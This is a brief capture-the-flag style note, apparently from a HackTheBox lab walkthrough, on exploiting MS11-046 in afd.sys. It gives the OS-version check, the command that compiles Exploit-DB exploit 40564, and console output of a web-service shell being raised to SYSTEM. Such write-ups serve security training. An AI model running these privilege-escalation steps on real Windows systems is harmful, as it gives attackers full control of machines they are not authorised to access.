# Microsoft Windows (x86) - 'afd.sys' Local Privilege Escalation (MS11-046)

## Scanning

```
c:\windows\system32\inetsrv>systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
OS Name:                   Microsoft Windows 7 Enterprise
OS Version:                6.1.7600 N/A Build 7600
System Type:               X86-based PC
```

## Compile exploit

```
i686-w64-mingw32-gcc 40564.c -o 40564.exe -lws2_32
```

## Get system

```
c:\inetpub\wwwroot>whoami
whoami
iis apppool\web

c:\inetpub\wwwroot>40564.exe
40564.exe

c:\Windows\System32>whoami
whoami
nt authority\system
```

## Reference

[https://www.exploit-db.com/exploits/40564](https://www.exploit-db.com/exploits/40564)

[https://github.com/leecybersec/walkthrough/tree/master/hackthebox/devel](https://github.com/leecybersec/walkthrough/tree/master/hackthebox/devel)